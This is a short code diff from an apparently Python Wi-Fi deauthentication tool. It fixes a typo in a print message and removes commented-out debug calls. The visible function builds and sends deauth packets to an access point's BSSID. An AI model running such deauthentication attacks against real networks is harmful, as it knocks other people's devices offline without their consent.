@@ -10,7 +10,7 @@ def prepare_attack():
 
 def send_AP_deauth(AP):
 	pkt = AP.build_AP_deauth_pkt()
-	print("Seding deauth packet to %s" % (AP.BSSID))
+	print("Sending deauth packet to %s" % (AP.BSSID))
 	sendp(pkt, iface=network.interface_name, verbose=False)
 
 
@@ -44,9 +44,3 @@ def kill_processes():
                        check=True, capture_output=True)
     except subprocess.CalledProcessError:
         raise subprocess.CalledProcessError("Error killing processes.")
-
-
-# deauth_AP("66:D1:54:56:02:34", "wlan0")
-
-# managed_mode(["wlan0"])
-# run_NetworkManeger()
